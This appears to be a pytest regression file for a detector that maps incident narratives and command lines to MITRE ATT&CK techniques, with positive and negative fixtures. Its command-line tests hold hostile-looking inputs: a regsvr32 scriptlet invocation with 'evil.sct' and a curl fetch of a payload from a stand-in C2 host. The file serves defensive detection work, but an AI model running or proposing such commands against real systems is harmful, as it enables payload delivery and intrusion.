"""Phase 3.y · Narrative MITRE analyzer regression corpus.

Owner directive 2026-08-10 · scope:
  - Only extend `_cap_mitre_map` analyzer vocabulary/rules.
  - Multi-word contextual gating; no bare "RAT" trigger.
  - Preserve determinism; existing command-line MITRE mappings byte-identical.
  - Include false-positive negative fixtures.

Regression corpus:
  Positive fixtures (must fire):
    F1  · Cisco XDR narrative (real Sample.docx style)     → T1219 + T1204.002
    F2  · Ransomware attack narrative                      → T1486
    F3  · Credential-dumping narrative (mimikatz)          → T1003
    F4  · Phishing delivery narrative                      → T1566
    F5  · C2 beacon narrative                              → T1071

  Negative fixtures (must NOT fire):
    N1  · Bare "RAT" in unrelated context ("a rat in the walls")
    N2  · "malicious file" WITHOUT any execution verb
    N3  · Generic policy document mentioning "phishing" as a noun only
    N4  · Existing command-line rules regression check (must still fire)
"""
from __future__ import annotations

import hashlib

from canonical.iue import classify, RawInput
from canonical.executor import Executor
from canonical.ssot import InMemorySSOTStore


def _run(text: str):
    raw = RawInput(payload=text, filename="fixture.txt")
    iue = classify(raw)
    return Executor(store=InMemorySSOTStore()).run(iue, raw).ssot


def _mitre_ids(ssot) -> set:
    return {n.attrs.get("technique_id") for n in ssot.evidence_graph.nodes
            if n.kind == "mitre_technique"}


def _mitre_families(ssot) -> dict:
    out = {}
    for n in ssot.evidence_graph.nodes:
        if n.kind != "mitre_technique":
            continue
        out[n.attrs.get("technique_id")] = n.attrs.get("rule_family")
    return out


# =====================================================================
#   Positive fixtures — narrative rules must fire
# =====================================================================
F1_CISCO_XDR = (
    "On 2026-07-29 22:02:41 UTC Cisco XDR detected the execution of a "
    "known malicious file via Secure Endpoint which warrants additional "
    "investigation on host azg51-checkin-1. This is a high priority "
    "alert because the detected file is a Remote Access Trojan (RAT) "
    "and has executed on at least one device."
)


def test_f1_cisco_xdr_narrative_fires_t1219_and_t1204_002():
    s = _run(F1_CISCO_XDR)
    ids = _mitre_ids(s)
    assert "T1219" in ids, f"T1219 should fire on Cisco XDR narrative; got {ids}"
    assert "T1204.002" in ids, f"T1204.002 should fire; got {ids}"
    fams = _mitre_families(s)
    assert fams["T1219"] == "narrative_vendor_report"
    assert fams["T1204.002"] == "narrative_vendor_report"


F2_RANSOMWARE = (
    "Endpoint detection identified a ransomware attack against the "
    "finance file server. Data encrypted for impact affected 12 shares "
    "and a ransom note was dropped in every user home directory."
)


def test_f2_ransomware_narrative_fires_t1486():
    s = _run(F2_RANSOMWARE)
    assert "T1486" in _mitre_ids(s)


F3_MIMIKATZ = (
    "During the intrusion, the adversary executed mimikatz to perform "
    "credential dumping against lsass.exe. Domain admin hashes were "
    "extracted."
)


def test_f3_mimikatz_narrative_fires_t1003():
    assert "T1003" in _mitre_ids(_run(F3_MIMIKATZ))


F4_PHISHING = (
    "Users received a targeted spear phishing email carrying a "
    "spearphishing attachment disguised as an invoice PDF."
)


def test_f4_phishing_narrative_fires_t1566():
    assert "T1566" in _mitre_ids(_run(F4_PHISHING))


F5_C2 = (
    "The endpoint established a command and control channel to a "
    "known C2 server via a periodic C2 beacon over HTTPS."
)


def test_f5_c2_narrative_fires_t1071():
    assert "T1071" in _mitre_ids(_run(F5_C2))


# =====================================================================
#   Negative fixtures — narrative rules MUST NOT fire
# =====================================================================
N1_BARE_RAT = (
    "The technician reported hearing a rat scurrying in the ceiling. "
    "Maintenance was scheduled for the following Monday."
)


def test_n1_bare_rat_does_not_fire_t1219():
    ids = _mitre_ids(_run(N1_BARE_RAT))
    assert "T1219" not in ids, \
        f"Bare 'rat' must NOT trigger T1219; got {ids}"


N2_MALICIOUS_FILE_NO_EXEC = (
    "Our policy defines what constitutes a malicious file and describes "
    "the review workflow for suspected malicious files. Please refer to "
    "section 4.2 for the full taxonomy."
)


def test_n2_malicious_file_without_execution_does_not_fire_t1204_002():
    ids = _mitre_ids(_run(N2_MALICIOUS_FILE_NO_EXEC))
    assert "T1204.002" not in ids, \
        f"'malicious file' without execution verb must NOT fire; got {ids}"


N3_PHISHING_MENTION_ONLY = (
    "Please complete the annual security awareness training which "
    "covers topics including social engineering. See page 12 of the "
    "handbook."
)


def test_n3_no_phishing_phrase_no_fire():
    """Fixture deliberately omits every phishing MITRE-anchor phrase."""
    ids = _mitre_ids(_run(N3_PHISHING_MENTION_ONLY))
    assert "T1566" not in ids


# =====================================================================
#   N4 · Existing command-line rules must remain fully intact
# =====================================================================
def test_n4_command_line_rules_regression_powershell():
    s = _run("powershell -EncodedCommand SGVsbG8=")
    assert "T1059.001" in _mitre_ids(s)
    # Rule family stays "command_needle" (unchanged Phase 3 behaviour).
    fams = _mitre_families(s)
    assert fams["T1059.001"] == "command_needle"


def test_n4_command_line_rules_regression_regsvr32():
    s = _run("cmd /c regsvr32 /s /u evil.sct")
    ids = _mitre_ids(s)
    assert "T1059.003" in ids
    assert "T1218.010" in ids


def test_n4_command_line_rules_regression_curl():
    assert "T1105" in _mitre_ids(_run("curl http://c2.example/payload.sh"))


# =====================================================================
#   Determinism (Phase 3.y rules must be deterministic)
# =====================================================================
def test_determinism_narrative_rules_10_replays():
    fp0 = _run(F1_CISCO_XDR).fingerprint()
    for _ in range(10):
        assert _run(F1_CISCO_XDR).fingerprint() == fp0


# =====================================================================
#   Source-snippet provenance — every narrative MITRE node has a snippet
# =====================================================================
def test_narrative_nodes_carry_source_snippet():
    s = _run(F1_CISCO_XDR)
    for n in s.evidence_graph.nodes:
        if n.kind != "mitre_technique":
            continue
        if n.attrs.get("rule_family") != "narrative_vendor_report":
            continue
        assert n.attrs.get("source_snippet"), \
            f"narrative MITRE {n.attrs.get('technique_id')} missing source_snippet"
        assert n.provenance is not None
        # matched phrases recorded
        assert n.attrs.get("matched"), \
            f"narrative MITRE {n.attrs.get('technique_id')} missing matched list"


# =====================================================================
#   Reasoning steps carry the rule name
# =====================================================================
def test_narrative_reasoning_steps_use_narrative_rule_name():
    s = _run(F1_CISCO_XDR)
    narrative_rules = [r for r in s.reasoning_steps
                       if r.rule == "mitre.narrative_rule_match"]
    assert len(narrative_rules) >= 2, \
        f"expected ≥2 narrative reasoning steps; got {len(narrative_rules)}"
